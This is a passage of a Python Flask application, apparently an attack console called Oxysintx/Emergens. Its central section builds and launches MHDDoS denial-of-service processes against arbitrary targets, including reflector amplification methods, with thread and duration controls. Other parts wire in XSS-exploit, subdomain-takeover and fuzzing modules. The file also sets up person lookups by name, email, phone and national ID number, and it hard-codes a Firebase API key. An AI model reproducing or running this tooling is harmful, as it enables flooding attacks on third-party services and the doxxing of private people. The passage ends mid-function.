#!/usr/bin/env python3
"""
Oxysintx / Emergens — app.py v4.4.0
═══════════════════════════════════════════════════════════════════════════
Advanced production build.

Changelog v4.4.0
    • OSINT endpoint rewritten — full multi-method support
      (name / username / email / number / nik / any)
    • OSINT response format aligned with osint.js client
      {tool, method, query, data:{results, count, total, tookMs}}
    • OSINT rate limiter — per-IP token bucket (30 req/min, burst 10)
    • Standalone module detection — search_user.py excluded from scan
      pipeline with explicit startup log
    • Soft-import for search_user — feature disabled, not fatal
    • Route collision check now reports full endpoint name
    • Per-request client-IP resolution normalised in one helper
    • Uptime is monotonic-safe (uses time.monotonic for deltas)
    • Consistent error envelope across all /api/* endpoints
    • Better structured logger for OSINT + scan jobs
    • Payload guards on all POST endpoints (256 KB)

Changelog v4.3.0
    • New ASCII banner — "EMERGEN"
    • sse_response() now handles string yields cleanly
    • Idempotent signal handlers (no double-fire on SIGINT+SIGTERM)
    • Startup route collision detection with warning
    • request.get_json() is defensive — always returns a dict
    • _load_json() keeps a .bak before overwriting
    • atexit + signal handlers no longer race each other
    • New /api/version endpoint
    • Content-Type validation on JSON POST endpoints
    • Oversize body logging
    • Precise server_start_time for uptime

Changelog v4.2.0
    • Job Manager singleton — unified lifecycle for all async jobs
    • Async + SSE for: XSS, Sniper, Subdomain Takeover, Dirfuzz
    • threaded=True on Werkzeug dev server (fixes global 504s)
    • Graceful shutdown — cancel all running jobs, flush logger
    • Structured request log with client IP + UA on every 5xx

Author: Yanxzyx
"""

from __future__ import annotations

# ─── Standard library ──────────────────────────────────────────────────
import atexit
import base64
import binascii
import hashlib
import json
import logging
import os
import re
import secrets
import signal
import string
import sys
import threading
import time
import uuid
from collections import OrderedDict, defaultdict
from datetime import datetime, timedelta, timezone
from functools import wraps
from importlib import import_module
from pathlib import Path
from queue import Empty as QueueEmpty
from subprocess import Popen, PIPE
from typing import Any, Dict, Iterator, List, Optional, Tuple

# ─── Third-party ───────────────────────────────────────────────────────
import psutil
import requests
from bs4 import BeautifulSoup
from flask import (
    Flask, render_template, request, jsonify, session, redirect,
    send_from_directory, Response, g, stream_with_context,
)
from werkzeug.security import generate_password_hash, check_password_hash

# ─── Application ───────────────────────────────────────────────────────
from config import Config
from auth.user_store import (
    UserStore, ensure_default_user, verify_credentials, create_user, get_role,
    list_users, delete_user, DEFAULT_USERNAME, VALID_ROLES,
)
from auth.token_store import token_store
from core.logger_setup import setup_logging
from core.history_store import HistoryStore
from core.system_monitor import get_system_stats
from modules.scan_orchestrator import ScanOrchestrator, TOOL_MAP
from modules.source_viewer import run as fetch_source
from modules.telegram import (
    connect_bot, disconnect_bot, get_bot_status,
    update_bot_settings, broadcast_message, auto_restart_bot,
    set_orchestrator, set_history_store,
)
from modules.whatsapp import whatsapp_bp
from ai_chat.chat_handler import ChatHandler

# ─── OSINT module (standalone — excluded from scan pipeline) ───────────
try:
    from modules import search_user as osint_module
    _osint_available = True
except ImportError as _osint_exc:
    osint_module = None
    _osint_available = False
    _OSINT_IMPORT_ERROR = str(_osint_exc)

# ─── Optional blueprints ───────────────────────────────────────────────
try:
    from modules.downsea import downsea_bp
    _downsea_available = True
except ImportError:
    _downsea_available = False

try:
    from modules import testing as code_test_module
    _testing_available = True
except ImportError:
    _testing_available = False

try:
    from modules.analytic_manager import AnalyticDataManager
    _analytic_available = True
except ImportError:
    _analytic_available = False

# ─── Optional exploit modules ──────────────────────────────────────────
try:
    from modules import xss_exploiter as xss_module
    _xss_available = True
except ImportError:
    xss_module = None
    _xss_available = False

try:
    from modules import sniper as sniper_module
    _sniper_available = True
except ImportError:
    sniper_module = None
    _sniper_available = False

try:
    from modules import subdomain_takeover as takeover_module
    _takeover_available = True
except ImportError:
    takeover_module = None
    _takeover_available = False

try:
    from modules import dirfuzz as dirfuzz_module
    _dirfuzz_available = True
except ImportError:
    dirfuzz_module = None
    _dirfuzz_available = False

try:
    from modules.http_logger import HttpLogger
    _http_logger_available = True
except ImportError:
    HttpLogger = None
    _http_logger_available = False

_quick_menu_bp = None
_quick_menu_available = False
try:
    from modules import quick_menu
    if hasattr(quick_menu, "quick_menu_bp"):
        _quick_menu_bp = quick_menu.quick_menu_bp
        _quick_menu_available = True
    elif hasattr(quick_menu, "bp"):
        _quick_menu_bp = quick_menu.bp
        _quick_menu_available = True
except ImportError:
    pass


# ═══════════════════════════════════════════════════════════════════════════
# STARTUP BANNER
# ═══════════════════════════════════════════════════════════════════════════
BANNER = r"""
▓█████  ███▄ ▄███▓▓█████  ██▀███    ▄████ ▓█████  ███▄    █   ██████
▓█   ▀ ▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ ▒██    ▒
▒███   ▓██    ▓██░▒███   ▓██ ░▄█ ▒▒██░▄▄▄░▒███  ▓██  ▀█ ██▒░ ▓██▄
▒▓█  ▄ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  ░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒  ▒   ██▒
░▒████▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒░▒▓███▀▒░▒████▒██░   ▓██░▒██████▒▒
░░ ▒░ ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░ ░▒   ▒ ░░ ▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░ ░  ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░  ░   ░  ░ ░  ░ ░░   ░ ▒░░ ░▒  ░ ░
   ░   ░      ░      ░     ░░   ░ ░ ░   ░    ░     ░   ░ ░ ░  ░  ░
   ░  ░       ░      ░  ░   ░           ░    ░  ░        ░       ░
"""

BANNER_VERSION = "v4.4.0"
BANNER_TAGLINE = "  Field Intelligence Console  •  Python 3.13  •  Emergens Ops"


# ═══════════════════════════════════════════════════════════════════════════
# Paths & interpreter resolution
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent
MHDDOS_SCRIPT = _PROJECT_ROOT / "start.py"

_VENV_PY_WIN = _PROJECT_ROOT / ".venv" / "Scripts" / "python.exe"
_VENV_PY_UNIX = _PROJECT_ROOT / ".venv" / "bin" / "python"
if _VENV_PY_WIN.exists():
    PYTHON_EXE = str(_VENV_PY_WIN)
elif _VENV_PY_UNIX.exists():
    PYTHON_EXE = str(_VENV_PY_UNIX)
else:
    PYTHON_EXE = sys.executable

PROJECT_ROOT = str(_PROJECT_ROOT)

DATA_DIR = os.path.join(PROJECT_ROOT, "data")
LOG_DIR = os.path.join(PROJECT_ROOT, "logs")
UPLOAD_DIR = os.path.join(DATA_DIR, "uploads")
WORDLIST_DIR = _PROJECT_ROOT / "wordlist"
MHDDOS_LOG_DIR = _PROJECT_ROOT / "logs" / "mhddos"
HTTP_LOGGER_DIR = _PROJECT_ROOT / "logs" / "http_logger"

# ── Limits ─────────────────────────────────────────────────────────────
MAX_JSON_BODY_BYTES = 256 * 1024
JOB_TTL_DEFAULT = 1800
HEARTBEAT_INTERVAL = 10.0
JOB_SWEEP_INTERVAL = 60.0

# ── OSINT rate limits (per client IP) ──────────────────────────────────
OSINT_RATE_PER_MIN = 30
OSINT_RATE_BURST = 10
OSINT_MAX_QUERY_LEN = 120
OSINT_MIN_QUERY_LEN = 2
OSINT_VALID_METHODS = ("name", "username", "email", "number", "nik", "any")

# ── Server uptime tracking (monotonic-safe) ────────────────────────────
SERVER_START_WALL = time.time()
SERVER_START_MONO = time.monotonic()


# ═══════════════════════════════════════════════════════════════════════════
# JOB MANAGER — single source of truth for async work
# ═══════════════════════════════════════════════════════════════════════════
class _Job:
    __slots__ = ("job_id", "kind", "target", "status", "created", "started_at",
                 "finished_at", "results", "error", "cancel", "options",
                 "progress", "total", "done", "label")

    def __init__(self, job_id: str, kind: str, target: str,
                 options: Dict[str, Any]):
        self.job_id = job_id
        self.kind = kind
        self.target = target
        self.status = "running"
        self.created = time.time()
        self.started_at = datetime.now(timezone.utc).isoformat()
        self.finished_at: Optional[str] = None
        self.results: Optional[Dict[str, Any]] = None
        self.error: Optional[str] = None
        self.cancel = threading.Event()
        self.options = options
        self.progress = 0
        self.total = 0
        self.done = 0
        self.label = "initializing"

    def to_public(self, *, include_results: bool = False) -> Dict[str, Any]:
        out = {
            "job_id": self.job_id,
            "kind": self.kind,
            "target": self.target,
            "status": self.status,
            "created": self.created,
            "started_at": self.started_at,
            "finished_at": self.finished_at,
            "progress": self.progress,
            "done": self.done,
            "total": self.total,
            "label": self.label,
            "error": self.error,
        }
        if include_results:
            out["results"] = self.results
        return out


class JobManager:
    """Thread-safe registry for all background scan jobs."""

    def __init__(self, ttl: float = JOB_TTL_DEFAULT, max_per_kind: int = 3):
        self._jobs: Dict[str, _Job] = {}
        self._lock = threading.RLock()
        self._ttl = float(ttl)
        self._max_per_kind = max_per_kind
        self._sweeper_started = False

    def new_id(self, prefix: str) -> str:
        return f"{prefix}-{uuid.uuid4().hex[:8].upper()}"

    def active_count(self, kind: str) -> int:
        with self._lock:
            return sum(1 for j in self._jobs.values()
                       if j.kind == kind and j.status == "running")

    def can_start(self, kind: str) -> bool:
        return self.active_count(kind) < self._max_per_kind

    def register(self, job: _Job) -> None:
        with self._lock:
            self._jobs[job.job_id] = job

    def get(self, job_id: str) -> Optional[_Job]:
        with self._lock:
            return self._jobs.get(job_id)

    def list_by_kind(self, kind: Optional[str] = None) -> List[_Job]:
        with self._lock:
            return [j for j in self._jobs.values()
                    if kind is None or j.kind == kind]

    def finish(self, job_id: str, *, results: Optional[Dict[str, Any]] = None,
               error: Optional[str] = None) -> None:
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job.results = results
            job.error = error
            job.finished_at = datetime.now(timezone.utc).isoformat()
            if job.cancel.is_set():
                job.status = "cancelled"
            elif error:
                job.status = "failed"
            else:
                job.status = "completed"
            job.progress = 100

    def cancel(self, job_id: str) -> Dict[str, Any]:
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return {"error": "not_found"}
            if job.status != "running":
                return {"error": "job_not_running", "status": job.status}
            job.cancel.set()
            job.status = "cancelling"
            return {"success": True, "job_id": job_id}

    def cancel_all(self, kind: Optional[str] = None) -> int:
        n = 0
        with self._lock:
            for job in self._jobs.values():
                if kind is not None and job.kind != kind:
                    continue
                if job.status in ("running", "cancelling"):
                    job.cancel.set()
                    job.status = "cancelling"
                    n += 1
        return n

    def start_sweeper(self) -> None:
        if self._sweeper_started:
            return
        self._sweeper_started = True

        def _loop():
            while True:
                time.sleep(JOB_SWEEP_INTERVAL)
                self._sweep()

        threading.Thread(target=_loop, daemon=True,
                         name="job-sweeper").start()

    def _sweep(self) -> None:
        cutoff = time.time() - self._ttl
        with self._lock:
            for jid in [k for k, v in self._jobs.items() if v.created < cutoff]:
                self._jobs[jid].cancel.set()
                del self._jobs[jid]

    def update_progress(self, job_id: str, done: int, total: int,
                        label: str = "") -> None:
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job.done = done
            job.total = total
            job.label = label or job.label
            job.progress = int((done / total) * 100) if total else 0


job_manager = JobManager()


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS ENGINE — argv builder + process registry + log tail
# ═══════════════════════════════════════════════════════════════════════════
ALLOWED_PROXY_FILES = {"http.txt", "socks4.txt", "socks5.txt", "proxies.txt"}
ALLOWED_REFLECTOR_FILES = {"reflectors.txt"}
REQUIRED_L7_FILES = (Path("files") / "useragent.txt", Path("files") / "referers.txt")
VALID_PROXY_TYPES = {0, 1, 4, 5, 6}

_mhddos_processes: Dict[str, Dict[str, Any]] = {}
_mhddos_lock = threading.Lock()
_mhddos_history: List[Dict[str, Any]] = []
_MHDDOS_HISTORY_LIMIT = 500
_MHDDOS_LOG_TAIL_LINES = 40

_MHDDOS_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
    "TOR", "RHEX", "STOMP",
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
}
_MHDDOS_LAYER7 = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
    "TOR", "RHEX", "STOMP",
}
_MHDDOS_LAYER4 = {
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
}
_MHDDOS_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}


def _mhddos_build_command(method, target, threads, duration,
                          proxy_type=0, proxy_file="proxies.txt",
                          rpc=1, debug=False, reflector_file=""):
    cmd = [PYTHON_EXE, str(MHDDOS_SCRIPT)]
    safe_proxy = Path(proxy_file or "").name or "proxies.txt"
    if safe_proxy not in ALLOWED_PROXY_FILES:
        safe_proxy = "proxies.txt"
    safe_reflector = Path(reflector_file or "").name
    if safe_reflector and safe_reflector not in ALLOWED_REFLECTOR_FILES:
        safe_reflector = "reflectors.txt"
    threads = max(1, min(int(threads), 2000))
    duration = max(1, min(int(duration), 86400))
    rpc = max(1, min(int(rpc), 10000))
    proxy_type = int(proxy_type)
    if proxy_type not in VALID_PROXY_TYPES:
        proxy_type = 0

    if method in _MHDDOS_LAYER7:
        url = target if target.startswith(("http://", "https://")) else f"http://{target}"
        cmd.extend([method, url, str(proxy_type), str(threads),
                    safe_proxy, str(rpc), str(duration)])
        if debug:
            cmd.append("debug")
    else:
        ip_port = target
        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d+$", ip_port):
            try:
                from socket import gethostbyname
                hostname, port = ip_port.rsplit(":", 1)
                ip_port = f"{gethostbyname(hostname)}:{port}"
            except Exception:
                pass
        cmd.extend([method, ip_port, str(threads), str(duration)])
        if method in _MHDDOS_AMP:
            cmd.append(safe_reflector or "reflectors.txt")
        else:
            cmd.extend([str(proxy_type), safe_proxy])
        if debug:
            cmd.append("debug")
    return cmd


def _mhddos_start_attack(attack_id, method, target, threads, duration,
                         proxy_type, proxy_file, rpc, reflector_file, debug):
    cmd = _mhddos_build_command(method, target, threads, duration,
                                proxy_type, proxy_file, rpc, debug, reflector_file)
    MHDDOS_LOG_DIR.mkdir(parents=True, exist_ok=True)
    log_path = MHDDOS_LOG_DIR / f"{attack_id}.log"

    try:
        log_fh = open(log_path, "w", encoding="utf-8", errors="replace")
        log_fh.write("$ " + " ".join(cmd) + "\n\n")
        log_fh.flush()
    except OSError as e:
        return {"success": False, "error": f"cannot open log file: {e}"}

    try:
        process = Popen(cmd, stdout=log_fh, stderr=log_fh, text=True,
                        cwd=PROJECT_ROOT)
    except Exception as e:
        try:
            log_fh.close()
        except Exception:
            pass
        return {"success": False, "error": str(e)}

    now_iso = datetime.now(timezone.utc).isoformat()
    with _mhddos_lock:
        _mhddos_processes[attack_id] = {
            "process": process, "log_fh": log_fh, "log_path": str(log_path),
            "method": method, "target": target, "threads": threads,
            "duration": duration, "proxy_type": proxy_type,
            "proxy_file": proxy_file, "rpc": rpc,
            "reflector_file": reflector_file, "debug": debug,
            "started_at": now_iso, "status": "running", "attack_id": attack_id,
        }
        _mhddos_history.append({
            "attack_id": attack_id, "method": method, "target": target,
            "threads": threads, "duration": duration,
            "started_at": now_iso, "status": "running",
        })
        if len(_mhddos_history) > _MHDDOS_HISTORY_LIMIT:
            del _mhddos_history[:-_MHDDOS_HISTORY_LIMIT]

    threading.Thread(target=_mhddos_monitor, args=(attack_id,),
                     daemon=True).start()
    return {"success": True, "attack_id": attack_id, "argv": cmd,
            "log": str(log_path)}


def _mhddos_read_log_tail(log_path, lines=_MHDDOS_LOG_TAIL_LINES):
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as f:
            return "".join(f.readlines()[-lines:])
    except OSError:
        return ""


def _mhddos_monitor(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info:
            return
        process = info["process"]
        log_fh = info.get("log_fh")
        log_path = info.get("log_path")

    returncode = None
    try:
        process.wait(timeout=info["duration"] + 15)
        returncode = process.returncode
        status = "completed" if returncode == 0 else "failed"
    except Exception:
        status = "timeout"
        try:
            process.kill()
        except Exception:
            pass

    try:
        if log_fh and not log_fh.closed:
            log_fh.flush()
            log_fh.close()
    except Exception:
        pass

    tail = ""
    if status in ("failed", "timeout") and log_path:
        tail = _mhddos_read_log_tail(log_path)

    ended_at = datetime.now(timezone.utc).isoformat()
    with _mhddos_lock:
        entry = _mhddos_processes.get(attack_id)
        if entry:
            entry["status"] = status
            entry["ended_at"] = ended_at
            entry["returncode"] = returncode
            if tail:
                entry["error_tail"] = tail
        for h in _mhddos_history:
            if h["attack_id"] == attack_id:
                h["status"] = status
                h["ended_at"] = ended_at
                if returncode is not None:
                    h["returncode"] = returncode
                break


def _mhddos_stop_attack(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info:
            return {"success": False, "error": "Attack not found"}
        try:
            if os.name == "nt":
                info["process"].kill()
            else:
                info["process"].send_signal(signal.SIGTERM)
            info["status"] = "stopped"
            info["ended_at"] = datetime.now(timezone.utc).isoformat()
        except Exception as e:
            return {"success": False, "error": str(e)}
        for entry in _mhddos_history:
            if entry["attack_id"] == attack_id:
                entry["status"] = "stopped"
                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
                break
    return {"success": True}


def _mhddos_stop_all():
    stopped = 0
    with _mhddos_lock:
        for info in _mhddos_processes.values():
            if info["status"] == "running":
                try:
                    info["process"].kill()
                    info["status"] = "stopped"
                    info["ended_at"] = datetime.now(timezone.utc).isoformat()
                    stopped += 1
                except Exception:
                    pass
    return {"success": True, "stopped": stopped}


_MHDDOS_SERIALISABLE_FIELDS = (
    "attack_id", "method", "target", "threads", "duration",
    "proxy_type", "proxy_file", "rpc", "reflector_file", "debug",
    "status", "started_at", "ended_at", "returncode", "error_tail", "log_path",
)


def _serialise_mhddos_entry(entry, *, include_runtime=False):
    if not entry:
        return None
    out = {k: entry[k] for k in _MHDDOS_SERIALISABLE_FIELDS if k in entry}
    for key, value in entry.items():
        if key in out or key in ("process", "log_fh", "thread",
                                  "cancel_event", "_lock"):
            continue
        if isinstance(value, (str, int, float, bool)) or value is None:
            out[key] = value
        elif isinstance(value, (list, tuple)):
            if all(isinstance(v, (str, int, float, bool)) or v is None
                   for v in value):
                out[key] = list(value)
    if include_runtime:
        process = entry.get("process")
        out["pid"] = getattr(process, "pid", None) if process else None
        try:
            started = entry.get("started_at")
            duration = int(entry.get("duration") or 0)
            if started and duration > 0:
                started_dt = datetime.fromisoformat(started.replace("Z", "+00:00"))
                if started_dt.tzinfo is None:
                    started_dt = started_dt.replace(tzinfo=timezone.utc)
                elapsed = max(0, int(
                    (datetime.now(timezone.utc) - started_dt).total_seconds()
                ))
                out["elapsed"] = elapsed
                out["remaining"] = max(0, duration - elapsed)
                out["progress_pct"] = min(100, round((elapsed / duration) * 100, 1))
            else:
                out["elapsed"] = 0
                out["remaining"] = duration
                out["progress_pct"] = 0
        except Exception:
            out["elapsed"] = 0
            out["remaining"] = int(entry.get("duration") or 0)
            out["progress_pct"] = 0
    return out


def _mhddos_get_status(attack_id=None):
    with _mhddos_lock:
        if attack_id:
            entry = _mhddos_processes.get(attack_id)
            if entry is None:
                return None
            return _serialise_mhddos_entry(entry, include_runtime=True)
        running = [
            _serialise_mhddos_entry(v, include_runtime=True)
            for v in _mhddos_processes.values()
            if v.get("status") == "running"
        ]
        history = [
            _serialise_mhddos_entry(h, include_runtime=False)
            for h in _mhddos_history[-50:]
        ]
        return {
            "running": running,
            "history": history,
            "available": True,
            "methods": sorted(_MHDDOS_METHODS),
            "layer7": sorted(_MHDDOS_LAYER7),
            "layer4": sorted(_MHDDOS_LAYER4),
            "amplification": sorted(_MHDDOS_AMP),
        }


# ═══════════════════════════════════════════════════════════════════════════
# Firebase configuration
# ═══════════════════════════════════════════════════════════════════════════
firebaseConfig = {
    "apiKey": os.getenv("FIREBASE_API_KEY", "AIzaSyBmcSWhaqkk5u13MCnw3kB6M9wP4SySZCw"),
    "authDomain": os.getenv("FIREBASE_AUTH_DOMAIN", "emergens-auth.firebaseapp.com"),
    "databaseURL": os.getenv("FIREBASE_DB_URL", "https://emergens-auth-default-rtdb.firebaseio.com"),
    "projectId": os.getenv("FIREBASE_PROJECT_ID", "emergens-auth"),
    "storageBucket": os.getenv("FIREBASE_STORAGE_BUCKET", "emergens-auth.firebasestorage.app"),
    "messagingSenderId": os.getenv("FIREBASE_SENDER_ID", "1085657141149"),
    "appId": os.getenv("FIREBASE_APP_ID", "1:1085657141149:web:16e7a8b888cb31a59e2974"),
}


# ═══════════════════════════════════════════════════════════════════════════
# Flask app
# ═══════════════════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = Config.SECRET_KEY
app.permanent_session_lifetime = timedelta(hours=8)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.getenv("SESSION_COOKIE_SECURE", "0") == "1",
    MAX_CONTENT_LENGTH=MAX_JSON_BODY_BYTES,
    JSON_SORT_KEYS=False,
)

app.register_blueprint(whatsapp_bp)
if _downsea_available:
    app.register_blueprint(downsea_bp)
if _quick_menu_available and _quick_menu_bp is not None:
    app.register_blueprint(_quick_menu_bp)

setup_logging(Config.SERVER_LOG_FILE)
logger = logging.getLogger("oxysintx")
osint_logger = logging.getLogger("oxysintx.osint")


# ═══════════════════════════════════════════════════════════════════════════
# Backing services
# ═══════════════════════════════════════════════════════════════════════════
history_store = HistoryStore()
chat_handler = ChatHandler(api_key=Config.ANTHROPIC_API_KEY)
user_store = UserStore()
scan_orchestrator = ScanOrchestrator()

set_orchestrator(scan_orchestrator)
set_history_store(history_store)


# ═══════════════════════════════════════════════════════════════════════════
# OSINT — standalone module guard
# ═══════════════════════════════════════════════════════════════════════════
def _verify_osint_is_standalone() -> Tuple[bool, str]:
    """
    Confirm modules.search_user is a standalone module and is NOT
    registered in the scan pipeline. Returns (ok, message).
    """
    if not _osint_available or osint_module is None:
        return False, "osint module not imported"

    excluded_attr = getattr(osint_module, "EXCLUDE_FROM_SCAN", None)
    module_type = getattr(osint_module, "MODULE_TYPE", "scan")
    info = getattr(osint_module, "TOOL_INFO", {}) or {}
    info_excluded = bool(info.get("scan_excluded") or
                         info.get("exclude_from_scan"))

    if not (excluded_attr or info_excluded or module_type == "standalone"):
        return False, ("osint module missing EXCLUDE_FROM_SCAN / "
                       "MODULE_TYPE='standalone' flag — add them to "
                       "prevent it being picked up by the scan pipeline")

    # Verify it's not in the scan orchestrator's tool map
    try:
        registered = getattr(scan_orchestrator, "list_tools", lambda: {})()
        if isinstance(registered, dict) and "search_user" in registered:
            return False, ("search_user is registered in scan orchestrator — "
                           "remove it from TOOL_MAP or add the standalone flag")
    except Exception:
        pass

    return True, "standalone confirmed"


_osint_standalone_ok, _osint_standalone_msg = _verify_osint_is_standalone()


# ═══════════════════════════════════════════════════════════════════════════
# HTTP Request Logger
# ═══════════════════════════════════════════════════════════════════════════
http_logger = None
if _http_logger_available:
    try:
        HTTP_LOGGER_DIR.mkdir(parents=True, exist_ok=True)
        http_logger = HttpLogger(
            max_entries=5000,
            max_body_bytes=8192,
            persist_dir=HTTP_LOGGER_DIR,
        )
        http_logger.attach(app)
        logger.info("HTTP Request Logger attached (buffer=5000)")
    except Exception as _hl_exc:
        http_logger = None
        logger.error("HTTP Request Logger failed to attach: %s", _hl_exc)


# ═══════════════════════════════════════════════════════════════════════════
# Directories
# ═══════════════════════════════════════════════════════════════════════════
for d in ["userdata", "listschool", os.path.join("static", "data"),
          "files", os.path.join("files", "proxies"),
          os.path.join("logs", "mhddos"), "wordlist"]:
    os.makedirs(os.path.join(PROJECT_ROOT, d), exist_ok=True)

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)


# ═══════════════════════════════════════════════════════════════════════════
# Thread-safe JSON I/O — with automatic .bak on overwrite
# ═══════════════════════════════════════════════════════════════════════════
_json_locks: Dict[str, threading.Lock] = defaultdict(threading.Lock)


def _load_json(name: str, default: Any) -> Any:
    path = os.path.join(DATA_DIR, f"{name}.json")
    with _json_locks[name]:
        if not os.path.exists(path):
            return default
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Corrupt JSON at %s (%s) — trying .bak", path, exc)
            bak = path + ".bak"
            if os.path.exists(bak):
                try:
                    with open(bak, "r", encoding="utf-8") as f:
                        return json.load(f)
                except (json.JSONDecodeError, OSError):
                    pass
            return default


def _save_json(name: str, data: Any) -> None:
    path = os.path.join(DATA_DIR, f"{name}.json")
    tmp = path + ".tmp"
    bak = path + ".bak"
    with _json_locks[name]:
        if os.path.exists(path):
            try:
                os.replace(path, bak)
            except OSError:
                pass
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError:
                pass
        os.replace(tmp, path)


def _json_lock(name: str) -> threading.Lock:
    return _json_locks[name]


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _client_ip() -> str:
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    real = request.headers.get("X-Real-IP", "").strip()
    if real:
        return real
    return request.remote_addr or "unknown"


def _json_body() -> Dict[str, Any]:
    """Defensive JSON extraction — always returns a dict."""
    data = request.get_json(silent=True)
    if isinstance(data, dict):
        return data
    return {}


def _err(message: str, status: int = 400, **extra) -> Tuple[Response, int]:
    payload = {"error": message, **extra}
    return jsonify(payload), status


# ═══════════════════════════════════════════════════════════════════════════
# Request counters
# ═══════════════════════════════════════════════════════════════════════════
_request_log_lock = threading.Lock()
_request_timestamps: List[float] = []
_total_requests_seen = 0
_net_traffic_started_at = time.time()
_prev_net_counters = {"t": 0.0, "total": 0}


@app.before_request
def _count_inbound_request():
    global _total_requests_seen
    with _request_log_lock:
        now = time.time()
        _total_requests_seen += 1
        _request_timestamps.append(now)
        cutoff = now - 60
        while _request_timestamps and _request_timestamps[0] < cutoff:
            _request_timestamps.pop(0)


def _inbound_stats() -> tuple:
    with _request_log_lock:
        return _total_requests_seen, len(_request_timestamps)


# ═══════════════════════════════════════════════════════════════════════════
# Error handlers
# ═══════════════════════════════════════════════════════════════════════════
@app.errorhandler(413)
def _payload_too_large(_e):
    logger.warning("413 payload_too_large from %s — %s",
                    _client_ip(),
                    request.content_length or "unknown")
    return jsonify({"error": "payload_too_large",
                    "max_bytes": MAX_JSON_BODY_BYTES}), 413


# ═══════════════════════════════════════════════════════════════════════════
# SSE helper — uniform streaming response with heartbeat
# ═══════════════════════════════════════════════════════════════════════════
def sse_response(generator: Iterator[Any],
                 heartbeat: float = HEARTBEAT_INTERVAL) -> Response:
    def _gen():
        try:
            yield ": connected\n\n"
            last_hb = time.time()
            for event in generator:
                if isinstance(event, str):
                    yield event
                    last_hb = time.time()
                    continue

                now = time.time()
                if now - last_hb > heartbeat:
                    yield (f"data: "
                           f"{json.dumps({'type': 'heartbeat', 'elapsed': round(now - last_hb, 2)})}"
                           f"\n\n")
                    last_hb = now

                try:
                    payload = json.dumps(event, ensure_ascii=False, default=str)
                except (TypeError, ValueError):
                    payload = json.dumps({"type": "error",
                                           "message": "unserialisable event"})
                yield f"data: {payload}\n\n"

                if isinstance(event, dict) and event.get("type") in (
                    "complete", "result", "error",
                ):
                    yield ": flush\n\n"
                last_hb = time.time()
        except GeneratorExit:
            return
        except Exception as e:  # noqa: BLE001
            logger.exception("SSE stream raised")
            try:
                yield (f"data: "
                       f"{json.dumps({'type': 'error', 'message': str(e)})}"
                       f"\n\n")
            except Exception:
                pass

    return Response(
        stream_with_context(_gen()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-transform",
            "Pragma": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


# ═══════════════════════════════════════════════════════════════════════════
# API-key helpers
# ═══════════════════════════════════════════════════════════════════════════
def _hash_api_key(raw_key: str) -> str:
    return hashlib.sha256(raw_key.encode("utf-8")).hexdigest()


def _public_key_view(k: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "prefix": k.get("prefix") or k.get("key_prefix"),
        "created": k.get("created_at") or k.get("created"),
        "last_used": k.get("last_used"),
        "request_count": k.get("request_count", 0),
    }


def _record_server_activity(key_prefix: str, username: str, req) -> None:
    reported_name = (
        req.headers.get("X-Server-Name")
        or (req.get_json(silent=True) or {}).get("server_name")
        or None
    )
    ip = req.headers.get("X-Forwarded-For", req.remote_addr) or "unknown"
    with _json_lock("servers"):
        servers = _load_json("servers", [])
        entry = next((s for s in servers if s["key_prefix"] == key_prefix),
                     None)
        if entry:
            entry["last_seen"] = _now_iso()
            entry["requests"] = entry.get("requests", 0) + 1
            entry["ip"] = ip
            if reported_name:
                entry["server_name"] = reported_name
        else:
